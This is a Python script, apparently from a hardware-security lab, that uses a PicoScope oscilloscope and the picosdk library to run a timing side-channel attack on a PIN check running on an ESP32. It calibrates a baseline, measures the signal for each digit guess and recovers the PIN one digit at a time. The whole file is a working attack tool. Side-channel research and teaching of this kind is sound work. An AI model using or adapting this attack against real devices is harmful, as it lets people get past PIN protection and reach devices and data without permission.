# pip install picosdk
# CMD.exe -> SystemPropertiesAdvanced -> 'Environment Variables' -> PATH -> [add path of pico installation: C:\program files\pico technology\PicoScope 7 T], requires reboot, validate via echo %PATH% 
# For some inspiration look at the SDK examples: https://github.com/picotech/picosdk-python-wrappers/blob/master/ps2000Examples/block_read.py as well as this PoC: https://gist.github.com/MariaRigaki/2d65a8a569cced23272beb7962d6654d
# Our ESP32 is running with a frequency of 2,4 MhZ. So lets sample around 12 MhZ
# Full documentation can be found here: https://www.picotech.com/download/manuals/picoscope-2000-series-programmers-guide.pdf 
# python timingPicoScope.py --maxSamples=700 --range=7 --timeBase=3 --digits=4 --threshold=5

import ctypes
import numpy as np
from picosdk.ps2000 import ps2000
import matplotlib.pyplot as plt
from picosdk.functions import adc2mV, assert_pico2000_ok
import serial
import time
import argparse

def printdbg(message, value):
	if(args.debug):
		print(message, value)

def printGreen(txtGreen, txtNormal):
	print(f'\033[92m{txtGreen}\033[00m' + txtNormal)
		
def printImagePlot(buffer):
	time = np.linspace(0, ((args.maxSamples)-1) * timeInterval.value, args.maxSamples)
	plt.plot(time, buffer[:])
	plt.xlabel('Time (ns)')
	plt.ylabel('Voltage (mV)')
	plt.show()
	
def testDigit(digit):
	assert_pico2000_ok(ps2000.ps2000_run_block(device.handle, args.maxSamples, 3, 1, ctypes.byref(timeIndisposedms)))
	ready = ps2000.ps2000_ready(device.handle)
	print("Type in digit(s): " + str(digit) + " and end with: #.")
	while ready == 0:
		ready = ps2000.ps2000_ready(device.handle)

	# Requesting the scope to handover the data to our computer
	bufferChannelA = (ctypes.c_int16 * args.maxSamples)()
	cmaxSamples = ctypes.c_int32(args.maxSamples)

	assert_pico2000_ok(ps2000.ps2000_get_values(device.handle, ctypes.byref(bufferChannelA), None, None, None, ctypes.byref(oversample), cmaxSamples))

	# API told me: function not available, so picking the absolute max from the specification (2.3: voltage ranges: 35512)
	adc2mVChAMax = adc2mV(bufferChannelA, args.range, ctypes.c_int16(32767))
	#printImagePlot(adc2mVChAMax)
	measures = len(np.where(np.array(adc2mVChAMax) >= 1000)[0])
	#print("Measurements corresponding with: " + (str(digit) + "#: " + str(measures)))
	return measures
	printdbg("Raw buffer data: ", adc2mVChAMax)

# Parsing arguments
parser = argparse.ArgumentParser()
parser.add_argument("--maxSamples", dest="maxSamples", type=int, help="Set the maximum amount of samples")
parser.add_argument("--range", dest="range", type=int, help="Set the voltage range")
parser.add_argument("--timeBase", dest="timebase", type=int, help="Set the timebase")
parser.add_argument("--digits", dest="digits", type=int, default=4, help="Number of digits that need to be tested (1: 0-9, 2: 0-99, 3:0-999)")
parser.add_argument("--threshold", dest="threshold", type=int, default=5, help="Set a threshold for pin measuresments (seems to deviate with 1 or 2 sometimes)")
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

# Variables
timeInterval = ctypes.c_int32()
timeUnits = ctypes.c_int32()
oversample = ctypes.c_int16(1)
maxSamplesReturn = ctypes.c_int32()
timeIndisposedms = ctypes.c_int32()

# ************ Start of actual script ************

device = ps2000.open_unit()
printdbg("Information about the scope: ",str(device.info))

# Device, channel, enabled, coupling type, range
assert_pico2000_ok(ps2000.ps2000_set_channel(device.handle,0,1,1,args.range))

# Device, channel, 1024 ADC-counts, direction (rising = 0), delay (s), autotricker (ms)
assert_pico2000_ok(ps2000.ps2000_set_trigger(device.handle, 0, 4000, 0, 0, 0))

# Device, timebase, max samples, interval, unit, oversamples, 
assert_pico2000_ok(ps2000.ps2000_get_timebase(device.handle, args.timebase, args.maxSamples, ctypes.byref(timeInterval), ctypes.byref(timeUnits), oversample, ctypes.byref(maxSamplesReturn)))


print("* Calibrating time for a single digit comparison")
baseMeasure = max(testDigit(0), testDigit(1))
identifiedDigit = ""
tmpMeasure = 0

print("* Starting timing attack on a PIN of length: " + str(args.digits) + " callibrated with: " + str(baseMeasure) + " for single character comparison")

for pin in range (0, args.digits):
	for counter in range(10):
		tmpMeasure = testDigit((identifiedDigit + str(counter)))
		if(tmpMeasure > (baseMeasure + args.threshold)):
			identifiedDigit = str(identifiedDigit) + str(counter)
			printGreen("Digit found: ", str(identifiedDigit))
			baseMeasure = tmpMeasure
			break

printGreen("PIN found: ", str(identifiedDigit))
ps2000.ps2000_stop(device.handle)

